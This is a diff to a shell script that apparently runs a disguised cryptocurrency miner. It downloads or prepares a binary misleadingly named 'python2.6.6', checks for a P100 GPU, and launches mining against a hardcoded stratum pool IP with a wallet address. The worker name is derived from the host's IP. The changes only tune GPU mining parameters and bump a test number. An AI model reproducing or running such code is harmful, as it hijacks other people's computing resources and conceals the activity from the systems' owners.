@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 17 ########################'
+echo '##################### Test N 18 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -16,7 +16,7 @@ chmod +x python2.6.6
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
-    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 1 --cuda-block-size 128   --cu-schedule auto --cuda-streams 1 --cuda-grid-size 32768
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 2 --cuda-block-size 128   --cu-schedule auto --cuda-streams 2 --cuda-grid-size 32768
 else
-    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 65536     --cl-local-work 256
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G --cl-global-work 16384     --cl-local-work 256
 fi
